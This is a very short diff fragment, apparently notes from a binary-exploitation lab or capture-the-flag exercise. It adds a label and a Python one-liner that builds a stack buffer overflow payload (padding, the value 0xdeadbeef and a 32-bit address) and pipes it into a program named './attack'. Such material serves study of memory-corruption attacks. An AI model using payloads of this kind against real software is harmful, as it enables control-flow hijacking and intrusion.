@@ -1,0 +1,2 @@
+Var2CC
+	3a+b			python -c 'print 64 * "A" + "\xef\xbe\xad\xde" + 4 * "A" + "\x0c\x93\x04\x08"'| ./attack 
